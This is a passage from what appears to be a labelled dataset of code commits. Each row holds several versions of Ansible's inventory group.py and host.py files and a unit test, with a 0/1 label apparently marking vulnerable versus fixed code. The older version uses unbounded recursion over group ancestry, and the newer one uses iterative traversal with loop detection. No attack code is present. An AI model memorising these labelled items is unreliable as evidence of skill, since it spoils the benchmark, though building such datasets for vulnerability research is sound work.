        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1
38,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0
39,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:
            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors()

            self.clear_hosts_cache()

    def _check_children_depth(self):

        try:
            for group in self.child_groups:
                group.depth = max([self.depth + 1, group.depth])
                group._check_children_depth()
        except RuntimeError:
            raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.parent_groups:
            g.clear_hosts_cache()

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.child_groups:
            kid_hosts = kid.get_hosts()
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def _get_ancestors(self):

        results = {}
        for g in self.parent_groups:
            results[g.name] = g
            results.update(g._get_ancestors())
        return results

    def get_ancestors(self):

        return self._get_ancestors().values()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/n/lib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self):
        # populate ancestors
        for group in self.groups:
            self.add_group(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.add_group(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/n",1
40,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
